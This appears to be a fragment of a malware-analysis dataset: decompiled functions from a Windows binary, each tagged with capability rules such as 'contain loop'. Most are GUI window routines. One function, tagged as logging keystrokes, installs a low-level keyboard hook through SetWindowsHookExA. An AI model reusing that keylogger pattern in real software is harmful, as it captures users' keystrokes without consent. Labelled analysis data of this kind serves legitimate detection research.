        "decompiled_code": "\nuint fcn.00444cd0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = fcn.00443dd4();\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00443dc0();\n            cVar1 = fcn.00443b34();\n            if (cVar1 != '\\0') {\n                uVar3 = fcn.00443dc0();\n                return uVar3;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00444cac();\n    iVar2 = fcn.00443dd4();\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00443dc0();\n            cVar1 = fcn.00443b34();\n            if (cVar1 != '\\0') {\n                uVar3 = fcn.00443dc0();\n                return uVar3;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 252
    },
    "00445440": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00445440(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00406774();\n    if (-1 < iVar1) {\n        iVar1 = iVar1 + 1;\n        iVar2 = 0;\n        do {\n            if (param_2 == *(*(in_EAX + 0xd0) + 4 + iVar2 * 0xc)) {\n                *(*(in_EAX + 0xd0) + 4 + iVar2 * 0xc) = 0;\n                *(*(in_EAX + 0xd0) + iVar2 * 0xc) = 0xffffffff;\n                return;\n            }\n            iVar2 = iVar2 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 209
    },
    "00446dec": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00446dec(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    int32_t iVar5;\n    \n    iVar2 = fcn.00443e20();\n    if (-1 < iVar2 + -1) {\n        do {\n            piVar3 = fcn.00443e0c();\n            cVar1 = fcn.00458904();\n            if (cVar1 != '\\0') {\n                uVar4 = fcn.004585f8();\n                iVar5 = sub.user32.dll_IsWindowVisible(uVar4);\n                if (iVar5 != 0) {\n                    uVar4 = fcn.004585f8();\n                    iVar5 = sub.user32.dll_IsWindowEnabled(uVar4);\n                    if (iVar5 != 0) {\n                        (**(*piVar3 + 0xec))();\n                    }\n                }\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 231
    },
    "00447dd0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00447dd0(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    iVar1 = sub.user32.dll_GetCapture();\n    if (iVar1 == 0) {\n        iVar1 = *(in_EAX + 0x44);\n        if ((iVar1 == 0) || (*param_2 != *(iVar1 + 0x29c))) {\n            iVar1 = fcn.0044d2f4();\n            while ((iVar1 == 0 && (iVar2 = sub.user32.dll_GetParent(),  iVar2 != 0))) {\n                iVar1 = fcn.0044d2f4();\n            }\n        }\n        if (iVar1 != 0) {\n            uVar3 = fcn.0040484c();\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 217
    },
    "0044910c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044910c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((*(in_EAX + 0x4c) != 0) && (iVar2 = *(*(in_EAX + 0x4c) + 8),  -1 < iVar2 + -1)) {\n        do {\n            iVar1 = fcn.00419898();\n            if (param_2 == iVar1) {\n                *(param_2 + 4) = 0;\n                fcn.0041978c();\n                return;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 175
    },
    "0044a74c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044a74c(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    uchar in_ZF;\n    \n    fcn.00405974(param_2);\n    if (!in_ZF) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.00404800();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x4c))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        fcn.00405584();\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "0044aa50": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044aa50(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (param_2 != in_EAX[0x20]) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.00404800();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x6c))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        in_EAX[0x20] = param_2;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 191
    },
    "0044aaac": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044aaac(uint param_1, int16_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (param_2 != *(in_EAX + 0x21)) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.00404800();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x70))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        *(in_EAX + 0x21) = param_2;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "0044ab10": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044ab10(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (param_2 != *(in_EAX + 0x86)) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.00404800();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x74))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        *(in_EAX + 0x86) = param_2;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 192
    },
    "0044aca8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0044aca8(uint param_1, int16_t param_2)\n\n{\n    int32_t iVar1;\n    int16_t iVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack20;\n    \n    iStack20 = -1;\n    iVar3 = (**(*in_EAX + 0x14))();\n    iVar1 = iStack20;\n    if (-1 < iVar3 + -1) {\n        iVar4 = 0;\n        do {\n            iVar2 = (**(*in_EAX + 0x18))();\n            iVar1 = iVar4;\n            if (param_2 == iVar2) break;\n            iVar4 = iVar4 + 1;\n            iVar3 = iVar3 + -1;\n            iVar1 = iStack20;\n        } while (iVar3 != 0);\n    }\n    iStack20 = iVar1;\n    return CONCAT44(iStack20, iStack20);\n}\n",
        "token_count": 220
    },
    "0044d714": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0044d714(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    bool bVar2;\n    \n    *param_1 = 0;\n    bVar2 = false;\n    while( true ) {\n        if (*(in_EAX + 8) <= *param_1) {\n            return bVar2;\n        }\n        iVar1 = fcn.00419898();\n        bVar2 = param_2 == *(iVar1 + 4);\n        if (bVar2) break;\n        *param_1 = *param_1 + 1;\n    }\n    return bVar2;\n}\n",
        "token_count": 155
    },
    "0044d74c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0044d74c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = fcn.004585f8();\n    iVar2 = iVar3;\n    while (iVar1 = iVar3,  iVar1 != 0) {\n        iVar3 = sub.user32.dll_GetParent();\n        iVar2 = iVar1;\n    }\n    return iVar2;\n}\n",
        "token_count": 105
    },
    "0044d830": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0044d830(uint param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack20;\n    \n    iVar4 = 0;\n    if (*(in_EAX + 8) != 0) {\n        if (*(in_EAX + 8) == 1) {\n            iStack20 = 0x44d84b;\n            piVar2 = fcn.00419898();\n            iVar4 = *piVar2;\n        }\n        else {\n            iStack20 = sub.user32.dll_GetDesktopWindow(param_1);\n            iVar3 = sub.user32.dll_GetTopWindow();\n            while ((iVar4 == 0 && (iVar3 != 0))) {\n                cVar1 = fcn.0044d714();\n                if (cVar1 == '\\0') {\n                    iVar3 = func_0x004081e8(iVar3, 2);\n                }\n                else {\n                    iVar4 = **(*(in_EAX + 4) + iStack20 * 4);\n                }\n            }\n        }\n    }\n    return CONCAT44(iStack20, iVar4);\n}\n",
        "token_count": 273
    },
    "0044e2b4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0044e2b4(void)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = sub.user32.dll_WindowFromPoint(*in_EAX, in_EAX[1]);\n    while ((iVar2 != 0 && (cVar1 = fcn.0044e254(),  cVar1 == '\\0'))) {\n        iVar2 = sub.user32.dll_GetParent();\n    }\n    return iVar2;\n}\n",
        "token_count": 109
    },
    "0044edd8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0044edd8(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = sub.user32.dll_WindowFromPoint(*in_EAX, in_EAX[1]);\n    iVar2 = 0;\n    while ((iVar1 != 0 && (iVar2 = fcn.0044d2f4(),  iVar2 == 0))) {\n        iVar1 = sub.user32.dll_GetParent();\n    }\n    return iVar2;\n}\n",
        "token_count": 115
    },
    "00450400": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00450400(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        do {\n            cVar1 = fcn.004047dc();\n            if (cVar1 != '\\0') {\n                fcn.00440f80();\n            }\n            in_EAX = *(in_EAX + 0x30);\n        } while (in_EAX != 0);\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "00454450": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00454450(uint param_1, uint32_t param_2)\n\n{\n    uint32_t in_EAX;\n    \n    for (; (param_2 != 0 && (in_EAX != param_2)); param_2 = *(param_2 + 0x30)) {\n    }\n    return in_EAX & 0xffffff00 | param_2 != 0;\n}\n",
        "token_count": 90
    },
    "00454de4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00454de4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.004198f4();\n    iVar2 = *(*(in_EAX + 0x1d0) + 8) + -1;\n    if (iVar1 + 1 <= iVar2) {\n        iVar1 = (iVar2 - (iVar1 + 1)) + 1;\n        do {\n            iVar2 = fcn.00419898();\n            if (*(iVar2 + 0x1b4) != 0) {\n                return *(iVar2 + 0x1b4);\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 181
    },
    "00459998": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00459998(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (param_2 == '\\0') {\n        *(in_EAX + 0x54) = *(in_EAX + 0x54) & 0xdfff;\n    }\n    else {\n        *(in_EAX + 0x54) = *(in_EAX + 0x54) | 0x2000;\n    }\n    if ((*(in_EAX + 0x1d0) != 0) && (iVar1 = *(*(in_EAX + 0x1d0) + 8),  -1 < iVar1 + -1)) {\n        do {\n            fcn.00419898();\n            fcn.00459998();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 209
    },
    "0045a49c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0045a49c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    while( true ) {\n        if (in_EAX == 0) {\n            return 0;\n        }\n        cVar1 = fcn.0045a538();\n        if (cVar1 != '\\0') break;\n        in_EAX = *(in_EAX + 0xc);\n    }\n    return in_EAX;\n}\n",
        "token_count": 102
    },
    "0045a500": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0045a500(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    for (iVar1 = *(in_EAX + 8); iVar1 != 0; iVar1 = *(iVar1 + 0xc)) {\n        iVar2 = iVar2 + 1;\n    }\n    return iVar2;\n}\n",
        "token_count": 94
    },
    "0045a514": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0045a514(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    iVar1 = fcn.0045ab5c();\n    while (iVar1 != 0) {\n        iVar1 = fcn.0045ab34();\n        iVar2 = iVar2 + 1;\n    }\n    return iVar2;\n}\n",
        "token_count": 89
    },
    "0045a538": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuchar fcn.0045a538(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar uVar3;\n    \n    if (*(in_EAX + 4) == 0) {\n        for (iVar2 = fcn.0045ab5c(); iVar2 != 0; iVar2 = *(iVar2 + 0xc)) {\n            cVar1 = fcn.0045a538();\n            if (cVar1 != '\\0') {\n                return 1;\n            }\n        }\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = *(*(in_EAX + 4) + 0x57);\n    }\n    return uVar3;\n}\n",
        "token_count": 163
    },
    "0045a8ac": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045a8ac(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = *(*(arg_8h + -4) + 0x14);\n    while( true ) {\n        if (iVar1 == 0) {\n            return 0;\n        }\n        iVar2 = fcn.0045ab34();\n        if (iVar2 != 0) break;\n        iVar1 = *(iVar1 + 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 123
    },
    "0045aa84": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0045aa84(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = *(in_EAX + 8);\n    do {\n        iVar1 = *(iVar1 + 0xc);\n    } while (iVar1 != 0);\n    return;\n}\n",
        "token_count": 69
    },
    "0045aa94": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0045aa94(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    fcn.0045aa80();\n    for (iVar1 = *(in_EAX + 8); iVar1 != 0; iVar1 = *(iVar1 + 0xc)) {\n        iVar2 = fcn.0045a500();\n        if (0 < iVar2) {\n            fcn.0045aa84();\n            fcn.0045aa94();\n        }\n    }\n    return;\n}\n",
        "token_count": 123
    },
    "0045aad4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0045aad4(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = *(in_EAX + 8);\n    do {\n        if (iVar1 == 0) {\n            return;\n        }\n        iVar2 = fcn.0045aa58();\n        iVar3 = fcn.0045a570();\n        if (iVar2 < iVar3) {\ncode_r0x0045ab08:\n            fcn.0045a73c();\n            fcn.0045ae14(0x45c910, *(in_EAX + 0x1c));\n        }\n        else {\n            iVar2 = fcn.0045aa58();\n            iVar3 = fcn.0045a5b8();\n            if (iVar3 < iVar2) goto code_r0x0045ab08;\n        }\n        fcn.0045aad4();\n        iVar1 = *(iVar1 + 0xc);\n    } while( true );\n}\n",
        "token_count": 231
    },
    "0045ab40": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0045ab40(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = *(in_EAX + 0x18);\n    while( true ) {\n        if (iVar2 == 0) {\n            return 0;\n        }\n        cVar1 = fcn.0045a538();\n        if (cVar1 != '\\0') break;\n        iVar2 = *(iVar2 + 0x18);\n    }\n    return iVar2;\n}\n",
        "token_count": 119
    },
    "0045add8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045add8(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    (**(arg_8h + 8))();\n    if (*(in_EAX + 0xc) != 0) {\n        fcn.0045add8(arg_8h);\n    }\n    if (*(in_EAX + 8) != 0) {\n        fcn.0045add8(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "0045bf30": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045bf30(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xc) != 0) {\n        fcn.0045bf30(arg_8h);\n    }\n    if (*(in_EAX + 8) != 0) {\n        fcn.0045bf30(arg_8h);\n    }\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 100
    },
    "0045c708": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045c708(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    if (in_EAX != 0) {\n        iVar2 = fcn.0045ab34();\n        if ((iVar2 == 0) && (in_EAX != *(*(arg_8h + -4) + 100))) {\n            cVar1 = fcn.0045a538();\n            if (cVar1 != '\\0') {\n                if (*(*(arg_8h + -4) + 100) == *(in_EAX + 0x14)) {\n                    fcn.0045aa80();\n                }\n                else {\n                    fcn.0045aa58();\n                    fcn.0045aa80();\n                }\n            }\n        }\n        iVar2 = arg_8h;\n        fcn.0045ab5c();\n        fcn.0045c708(iVar2);\n        fcn.0045ab34();\n        fcn.0045c708(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 244
    },
    "0045cb7c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045cb7c(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    cVar1 = fcn.0045a4b8();\n    if (cVar1 == '\\0') {\n        *(in_EAX + 0x24) = 0;\n    }\n    else {\n        iVar2 = fcn.0045a570();\n        *(in_EAX + 0x24) = *(in_EAX + 0x20) - iVar2;\n    }\n    if (*(in_EAX + 0x14) != 0) {\n        cVar1 = fcn.0045a538();\n        if (cVar1 == '\\0') {\n            fcn.0045cb7c(arg_8h);\n        }\n    }\n    iVar2 = fcn.0045ab40();\n    if (iVar2 != 0) {\n        fcn.0045ab40();\n        fcn.0045aa94();\n    }\n    fcn.0045ae14(0x45c910, *(arg_8h + -4));\n    return;\n}\n",
        "token_count": 258
    },
    "0045e7b4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0045e7b4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    uint unaff_EBX;\n    uchar *unaff_ESI;\n    uint *in_FS_OFFSET;\n    uint *arg_8h;\n    uint in_stack_ffffffd0;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uchar *var_18h;\n    uchar *var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    var_ch = 4;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_1ch = 0x45e8fe;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_20h;\n    var_14h = unaff_ESI;\n    var_10h = unaff_EBX;\n    cVar1 = fcn.0045e90c();\n    if (cVar1 == '\\0') {\n        uVar2 = fcn.0040700c();\n        in_stack_ffffffd0 = *(in_EAX + 0x30);\n        uVar3 = sub.oleaut32.dll_GetActiveObject(in_stack_ffffffd0, 0, uVar2);\n        if ((uVar3 & 0x80000000) != 0) {\n            fcn.0042be44();\n        }\n    }\n    else if (cVar1 == '\\x01') {\n        fcn.0042be44();\n    }\n    else if (cVar1 == '\\x02') {\n        uVar2 = fcn.0040700c();\n        in_stack_ffffffd0 = *(in_EAX + 0x30);\n        uVar3 = sub.oleaut32.dll_GetActiveObject(in_stack_ffffffd0, 0, uVar2);\n        if ((uVar3 & 0x80000000) != 0) {\n            arg_8h = &var_4h;\n            fcn.0042be18();\n            var_14h = var_18h;\n            var_10h = CONCAT31(var_10h._1_3_, 0xb);\n            fcn.0042bd90();\n            var_ch = var_1ch;\n            var_8h._0_1_ = 0xb;\n            fcn.00407550(&var_14h);\n            fcn.0040af98(arg_8h);\n            fcn.0042bbf8(0, uVar3);\n            fcn.00404ec4();\n        }\n    }\n    else if (cVar1 == '\\x03') {\n        fcn.00405ea8();\n        fcn.0042bf5c();\n    }\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    fcn.00405d28(0x45e905);\n    fcn.00405554();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 771
    },
    "00461b8c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00461b8c(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    puStack24 = 0x461b9e;\n    fcn.004059cc();\n    uStack28 = 0x461c0e;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    uStack40 = 0x461be7;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    iVar2 = 1;\n    puStack24 = &stack0xfffffffc;\n    while( true ) {\n        iVar1 = fcn.0040580c();\n        if (iVar1 < iVar2) break;\n        fcn.004619e4();\n        iVar2 = iVar2 + 1;\n    }\n    *in_FS_OFFSET = uStack44;\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x461c15;\n    uStack28 = 0x461c0d;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 308
    },
    "004662c4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004662c4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    for (iVar1 = 0; (iVar1 < *(in_EAX + 8) && (param_2 != *(*(in_EAX + 4) + iVar1 * 4))); iVar1 = iVar1 + 1) {\n    }\n    if (iVar1 == *(in_EAX + 8)) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 127
    },
    "0046f148": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0046f148(void)\n\n{\n    int32_t iVar1;\n    \n    *0x494228 = 0;\n    iVar1 = sub.user32.dll_GetWindow();\n    while (iVar1 != 0) {\n        iVar1 = func_0x004081e8(iVar1, 2);\n        *0x494228 = *0x494228 + 1;\n    }\n    iVar1 = *0x494228;\n    *0x494228 = 0;\n    return iVar1;\n}\n",
        "token_count": 116
    },
    "00481ed8": {
        "rules": [
            "contain loop",
            "set application hook",
            "log keystrokes via application hook"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.00481ed8(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    uint uVar3;\n    uint unaff_EBX;\n    uint *in_FS_OFFSET;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uchar *var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_14h = &stack0xfffffffc;\n    var_ch = 4;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_18h = 0x482007;\n    var_1ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_1ch;\n    var_10h = unaff_EBX;\n    uVar3 = sub.kernel32.dll_GetModuleHandleA_2(0, 0);\n    *0x49a1bc = sub.user32.dll_SetWindowsHookExA(0xd, fcn.004818f8, uVar3);\n    fcn.0048adcc();\n    fcn.00405818();\n    cVar2 = fcn.0040a290();\n    if (cVar2 == '\\0') {\n        fcn.0048adcc();\n        fcn.00405818();\n        fcn.0040a2b4();\n    }\n    fcn.0048adcc();\n    fcn.00480d08(0x482020, var_10h);\n    puVar1 = var_14h;\n    fcn.004058e0();\n    fcn.00403770();\n    fcn.00480d08();\n    fcn.00405584();\n    fcn.00480f70();\n    fcn.00405584();\n    fcn.00480f70();\n    fcn.00405584();\n    fcn.004810b0();\n    fcn.00405584();\n    *in_FS_OFFSET = puVar1;\n    fcn.00405554(0x48200e);\n    return;\n}\n",
        "token_count": 532
    },
    "004820c4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004820c4(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x482142;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    fcn.004033b8();\n    fcn.00405530();\n    iVar1 = 0x400;\n    do {\n        fcn.004033e0();\n        fcn.00405718();\n        fcn.00405818();\n        fcn.00405584();\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x482149;\n    uStack32 = 0x482141;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 230
    },
    "00482554": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00482554(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4825d2;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    fcn.004033b8();\n    fcn.00405530();\n    iVar1 = 0x400;\n    do {\n        fcn.004033e0();\n        fcn.00405718();\n        fcn.00405818();\n        fcn.00405584();\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x4825d9;\n    uStack32 = 0x4825d1;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 235
    },
    "0048550c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __fastcall fcn.0048550c(uint param_1, uint param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uchar uVar1;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = 6;\n    do {\n        var_10h = var_10h + -1;\n    } while (var_10h != 0);\n    var_18h = 0x485531;\n    var_8h = param_2;\n    fcn.004059cc();\n    var_18h = 0x485539;\n    fcn.004059cc();\n    uVar1 = true;\n    var_1ch = 0x485755;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0048550c::var_20h;\n    var_18h = &stack0xfffffffc;\n    fcn.00405974();\n    if (!uVar1) {\n        fcn.00405974();\n        if (!uVar1) {\n            fcn.00405974();\n            if (uVar1) {\n                fcn.00489d40();\n                fcn.0040a5d4();\n                var_2ch = var_8h;\n                fcn.004058e0(var_8h, 0x485790, var_ch);\n            }\n            fcn.00405974();\n            if (uVar1) {\n                fcn.00489d40();\n                fcn.00405864();\n            }\n            fcn.00405974();\n            if (uVar1) {\n                fcn.00489c78();\n                fcn.00405864();\n            }\n            fcn.00405974();\n            if (uVar1) {\n                fcn.0048adcc();\n                fcn.00405864();\n            }\n            fcn.00405974();\n            if (uVar1) {\n                fcn.0048adcc();\n                fcn.00405864();\n            }\n            